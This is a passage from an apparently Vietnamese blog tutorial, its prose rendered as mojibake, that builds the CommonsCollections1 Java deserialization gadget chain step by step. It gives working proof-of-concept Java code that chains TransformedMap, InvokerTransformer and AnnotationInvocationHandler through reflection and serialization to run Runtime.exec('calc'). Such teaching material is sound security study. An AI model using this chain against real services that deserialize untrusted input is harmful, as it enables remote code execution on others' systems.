ngáº¯n Ä‘á»ƒ exec calc vá»›i lá»›p InvokerTranformer rá»“i pháº£i khÃ´ng.</p><p>BÃ¢y giá» chÃºng ta sáº½ xem valueTransformer lÃ  gÃ¬:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/TransformedMap-Constructor.png"></p><p>valueTransformer lÃ  má»™t object cá»§a lá»›p Transformer.</p><p>HÃ m táº¡o nÃ y khai bÃ¡o protected nÃªn khÃ´ng thá»ƒ táº¡o trá»±c tiáº¿p, chÃºng ta cáº§n tÃ¬m phÆ°Æ¡ng thá»©c tráº£ vá» object cá»§a lá»›p nÃ y.</p><p>Trong lá»›p nÃ y cÃ³ phÆ°Æ¡ng thá»©c decorate return má»™t object cá»§a TransformedMap, cÃ¡c tham sá»‘ Ä‘áº§u vÃ o tÆ°Æ¡ng á»©ng vá»›i cÃ¡c tham sá»‘ cá»§a hÃ m táº¡o TransformedMap. ChÃºng ta sáº½ dÃ¹ng phÆ°Æ¡ng thá»©c nÃ y Ä‘á»ƒ táº¡o giÃ¡n tiáº¿p má»™t object cá»§a lá»›p TransformedMap.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/TransformedMap-decorate-png.png"></p><p>valueTransformer lÃ  má»™t object kiá»ƒu Transformer nÃªn chÃºng ta cÃ³ thá»ƒ truyá»n vÃ o má»™t object kiá»ƒu InvokerTransformer vÃ¬ tháº±ng nÃ y implements Transformer. PhÆ°Æ¡ng thá»©c checkSetValue lÃ  phÆ°Æ¡ng thá»©c protected nÃªn chÃºng ta cáº§n dÃ¹ng reflection Ä‘á»ƒ gá»i Ä‘áº¿n phÆ°Æ¡ng thá»©c nÃ y. </p><p>Chuá»—i poc ngáº¯n tá»« TranformedMap:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        String[] argsRuntime = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, argsRuntime);</span><br><span class="line">        <span class="type">TransformedMap</span> <span class="variable">transformedMap</span> <span class="operator">=</span> (TransformedMap) TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TransformedMap.class.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(transformedMap, Runtime.getRuntime());</span><br><span class="line">        <span class="comment">//tham sá»‘ cá»§a checkSetValue sáº½ Ä‘Æ°á»£c truyá»n bÃ o phÆ°Æ¡ng thá»©c transform nÃªn chÃºng ta sáº½ truyá»n vÃ o Runtime.getRuntime() tÆ°Æ¡ng tá»± nhÆ° invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÄÃ¢y chá»‰ lÃ  má»™t POC nhá», chá»‰ Ä‘á»ƒ chá»‰ ra ráº±ng lá»›p TransformedMap cÃ³ thá»ƒ kÃ­ch hoáº¡t Ä‘Æ°á»£c phÆ°Æ¡ng thá»©c cá»§a lá»›p Runtime. Váº¥n Ä‘á» cá»§a chÃºng ta bÃ¢y giá» lÃ  cáº§n tÃ¬m ai gá»i Ä‘áº¿n method checkSetValue nÃ y.</p><h3 id="AbstractMapEntryDecorator-MapEntry"><a href="#AbstractMapEntryDecorator-MapEntry" class="headerlink" title="AbstractMapEntryDecorator.MapEntry"></a>AbstractMapEntryDecorator.MapEntry</h3><p>Tiáº¿p tá»¥c <code>Ctrl + chuá»™t trÃ¡i</code> click vÃ o checkSetValue, ta tháº¥y phÆ°Æ¡ng thá»©c AbstractMapEntryDecorator.MapEntry.setValue() gá»i Ä‘áº¿n checkSetValue.</p><ul><li>Lá»›p AbstractMapEntryDecorator lÃ  abstract cha cá»§a lá»›p TransformedMap.</li><li>setValue lÃ  phÆ°Æ¡ng thá»©c cá»§a lá»›p Map.Entry.</li></ul><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/AbstractInputCheckedMapDecorator-entry-setValue.png"></p><p>TrÆ°á»›c tiÃªn chÃºng ta cáº§n hiá»ƒu entry lÃ  gÃ¬ Ã  cÃ¡ch nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng trong Map. CÃ¡c báº¡n cÃ³ thá»ƒ tham kháº£o á»Ÿ <a href="https://viblo.asia/p/cac-cach-iterate-map-trong-java-ORNZqjNMl0n">Ä‘Ã¢y</a>.</p><p>HÃ m setValue() sáº½ thá»±c hiá»‡n gÃ¡n giÃ¡ trá»‹ vÃ o key. Vá»›i thÆ° viá»‡n map, khi truy cáº­p tá»«ng cáº·p khÃ³a-giÃ¡ trá»‹ (entry) nÃ y chÃºng ta sáº½ dÃ¹ng cÃ¡ch duyá»‡t qua tá»«ng entry rá»“i thao tÃ¡c vá»›i tá»«ng entry Ä‘Ã³. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testMapIterator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;String,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key3&quot;</span>, <span class="string">&quot;value3&quot;</span>);</span><br><span class="line">        Set&lt;Map.Entry&lt;String, Object&gt;&gt; set = hashMap.entrySet();</span><br><span class="line">        System.out.println(<span class="string">&quot;Results: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;String, Object&gt; entry : set) &#123;</span><br><span class="line">            entry.setValue(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Results: </span></span><br><span class="line">    <span class="comment">//&#123;key1=aaa, key2=aaa, key3=aaa&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Theo dÃµi hÃ m setValue:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/override-setValue-1.png"></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/override-setValue-2.png"></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/override-setValue-3.png"></p><p>PhÆ°Æ¡ng thá»©c setValue cá»§a interface <code>java.util.Map</code> Ä‘Æ°á»£c implements bá»Ÿi lá»›p <code>AbstractMapEntryDecorator</code>, tiáº¿p Ä‘áº¿n phÆ°Æ¡ng thá»©c setValue cá»§a lá»›p nÃ y Ä‘Æ°á»£c Override bá»Ÿi phÆ°Æ¡ng thá»©c setValue cá»§a lá»›p <code>AbstractInputCheckedMapDecorator.MapEntry</code>.</p><p>Khi duyá»‡t map cá»§a lá»›p báº±ng <code>AbstractInputCheckedMapDecorator.EntrySetIterator</code>, phÆ°Æ¡ng thá»©c next() return ra má»™t <code>AbstractInputCheckedMapDecorator.MapEntry</code>.<br>Do Ä‘Ã³ chÃºng ta cÃ³ thá»ƒ gá»i Ä‘áº¿n hÃ m setValue() cá»§a <code>AbstractInputCheckedMapDecorator.MapEntry</code>.</p><p>Lá»›p transformedMap implements lá»›p <code>AbstractInputCheckedMapDecorator</code>, do Ä‘Ã³ khi chÃºng ta decorate má»™t map thÃ nh transformedMap vÃ  duyá»‡t map báº±ng entrySet() káº¿t há»£p vá»›i iterator rá»“i thá»±c hiá»‡n hÃ m setValue() cá»§a transformedMap, nÃ³ sáº½ thá»±c hiá»‡n hÃ m setValue cá»§a lá»›p <code>AbstractInputCheckedMapDecorator.MapEntry</code>, phÆ°Æ¡ng thá»©c nÃ y sáº½ gá»i Ä‘áº¿n hÃ m checkSetValue(). Báº¡n nÃ o má»›i há»c mÃ  khÃ´ng hiá»ƒu thÃ¬ Ä‘oáº¡n <code>Map.Entry entry : map.entrySet()</code> lÃ  lÃ m táº¯t bá» bÆ°á»›c define Iterator tuy nhiÃªn nÃ³ cÅ©ng iterator bÃªn trong Ä‘Ã³ nhÃ©. </p><p>Tiáº¿p tá»¥c viáº¿t poc tá»« phÆ°Æ¡ng thá»©c nÃ y:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());<span class="comment">//náº¿u báº¡n khÃ´ng hiá»ƒu dÃ²ng nÃ y thÃ¬ nhÃ¬n láº¡i hÃ m checkSetValue vÃ  POC trÃªn kia.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NÃ³ Ä‘Ã£ kÃ­ch hoáº¡t Ä‘Æ°á»£c lá»‡nh exec cá»§a lá»›p Runtime. BÃ¢y giá» chÃºng ta sáº½ tÃ¬m xem cÃ³ phÆ°Æ¡ng thá»©c readObject nÃ o gá»i phÆ°Æ¡ng thá»©c setValue nÃ y khÃ´ng. Click chuá»™t pháº£i vÃ o hÃ m setValue vÃ  chá»n Find Usage. á» Ä‘Ã¢y mÃ¬nh khÃ´ng thá»ƒ tÃ¬m Ä‘Æ°á»£c lá»›p nÃ o bá»Ÿi vÃ¬ mÃ¬nh chÆ°a decompile trá»±c tiáº¿p cÃ¡c file trong jdk8u65, khÃ¡ nhiá»u thá»© Ä‘á»ƒ lÃ m nÃªn thÃ´i mÃ¬nh sáº½ tiáº¿p tá»¥c lÃ m theo sÆ¡ Ä‘á»“ cá»§a ngÆ°á»i ta.</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>Ctrl + N</code> Ä‘á»ƒ tÃ¬m lá»›p AnnotationInvocationHandler, trong phÆ°Æ¡ng thá»©c readObject cá»§a lá»›p nÃ y, chÃºng ta tháº¥y cÃ³ phÆ°Æ¡ng thá»©c setValue Ä‘Æ°á»£c gá»i.<br>HÃ m táº¡o cá»§a lá»›p AnnotationInvocationHandler:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/AnnotationInvocationHandler.png"></p><p>HÃ m readObject cá»§a lá»›p AnnotationInvocationHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Lá»›p AnnotationInvocationHandler cÃ³ pháº¡m vi default, nÃªn chÃºng ta cáº§n láº¥y lá»›p nÃ y vÃ  hÃ m táº¡o cá»§a nÃ³ thÃ´ng qua reflection, sau Ä‘Ã³ khá»Ÿi táº¡o nÃ³. (stuck cÅ©ng lÃ¢u pháº¿t hic)</p><ul><li>Constructor cá»§a lá»›p Non-public pháº£i láº¥y báº±ng phÆ°Æ¡ng thá»©c getDeclaredConstructor().</li><li>Tham sá»‘ thá»© nháº¥t cá»§a hÃ m táº¡o lÃ  má»™t lá»›p, tham sá»‘ thá»© hai lÃ  má»™t map.</li></ul><p>Má»™t Ä‘oáº¡n code nhá» Ä‘á»ƒ test thá»­ viá»‡c khá»Ÿi táº¡o lá»›p AnnotationInvocationHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, map);<span class="comment">//Tham sá»‘ Ä‘áº§u cá»§a constructor lÃ  lá»›p báº¥t ká»³ káº¿ thá»«a Annotation, vÃ  Override.class lÃ  má»™t lá»›p thÃµa mÃ£n. CÃ¡c báº¡n cÃ³ thá»ƒ tá»± tÃ¬m hiá»ƒu thÃªm vá» Annotation.</span></span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Äáº¿n Ä‘Ã¢y váº«n chÆ°a cÃ³ gÃ¬ xáº£y ra bá»Ÿi vÃ¬:</p><ul><li>Äá»‘i tÆ°á»£ng Runtime chÆ°a Ä‘Æ°á»£c Ä‘áº·t vÃ o hÃ m setValue. VÃ  á»Ÿ Ä‘Ã¢y nÃ³ Ä‘Æ°á»£c set lÃ  object kiá»ƒu <code>AnnotationTypeMismatchExceptionProxy</code>, chÃºng ta khÃ´ng thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c.<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">    <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ChÃºng ta chÆ°a lÃ m thÃµa mÃ£n hai Ä‘iá»u kiá»‡n dáº«n Ä‘áº¿n hÃ m setValue trong AnnotationInvocationHandler.readObject.</li><li>Äá»‘i tÆ°á»£ng Runtime khÃ´ng thá»ƒ serialize vÃ  cáº§n Ä‘Æ°á»£c chuyá»ƒn Ä‘á»•i thÃ nh dáº¡ng cÃ³ thá»ƒ serialize thÃ´ng qua reflection.</li></ul><h3 id="Giai-quyet-van-de-Runtime-khong-the-serialize"><a href="#Giai-quyet-van-de-Runtime-khong-the-serialize" class="headerlink" title="Giáº£i quyáº¿t váº¥n Ä‘á» Runtime khÃ´ng thá»ƒ serialize"></a>Giáº£i quyáº¿t váº¥n Ä‘á» Runtime khÃ´ng thá»ƒ serialize</h3><p>Äá»ƒ thÃµa mÃ£n Ä‘Æ°á»£c Ä‘iá»u kiá»‡n serialize, má»i thá»© trong nÃ³ Ä‘á»u pháº£i serialize Ä‘Æ°á»£c. Tuy nhiÃªn Runtime khÃ´ng thá»ƒ serialize Ä‘Æ°á»£c, váº­y nÃªn chÃºng ta cáº§n dÃ¹ng Runtime.class Ä‘á»ƒ lÃºc deser, nÃ³ sáº½ táº¡o má»™t Ä‘á»‘i tÆ°á»£ng Runtime cho chÃºng ta.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>);<span class="comment">//method getRuntime() khÃ´ng cáº§n tham sá»‘</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Thay vÃ¬ invoke trá»±c tiáº¿p, chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng lá»›p InvokerTransformer Ä‘á»ƒ invoke hÃ m getRuntime hay invoke method vÃ  invoke exec cá»§a lá»›p runtime. MÃ¬nh sáº½ Ä‘i tá»«ng bÆ°á»›c cho cÃ¡c báº¡n dá»… hiá»ƒu.<br>Äáº§u tiÃªn lÃ  invoke method <code>getDeclaredMethod</code> Ä‘á»ƒ láº¥y ra method getRuntime.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i Method getRuntimeMethod = runtimeClass.getDeclaredMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">InvokerGetMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 